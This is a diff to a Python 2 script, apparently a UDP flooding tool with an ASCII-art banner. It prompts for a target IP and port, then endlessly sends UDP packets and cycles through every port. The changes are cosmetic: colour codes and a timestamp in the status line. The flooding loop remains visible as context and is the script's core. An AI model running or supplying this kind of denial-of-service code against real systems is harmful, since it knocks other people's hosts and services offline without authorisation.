@@ -18,9 +18,9 @@ print ("""
 | |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
 |       ||       | _____| || |_|   ||       |  |   |  
 |______| |_______||_______||_______||_______|  |___|v2
-\033[0;37;40m""");
-ip = raw_input("\033[1;36;40mIP: \033[1;33;40m");
-port = input("\033[1;36;40mPort: \033[1;33;40m");
+""");
+ip = raw_input("\033[1;33;40mIP: \033[1;33;40m");
+port = input("\033[1;33;40mPort: \033[1;33;40m");
 os.system("clear");
 sent = 0;
 while True:
@@ -32,6 +32,6 @@ while True:
      sock.sendto(bytes, (ip, port));
      sent = sent + 1;
      port = port + 1;
-     print "\033[1;33;40m<--%s-->   \033[1;36;40m<--%s:%s-->\033[0;37;40m" %(sent, ip, port);
+     print "\033[1;33;40m<--", time.ctime(time.time()), "-->   \033[1;36;40m<--%s:%s-->\033[0;37;40m" %(ip, port);
      if port == 65534:
        port = 1;
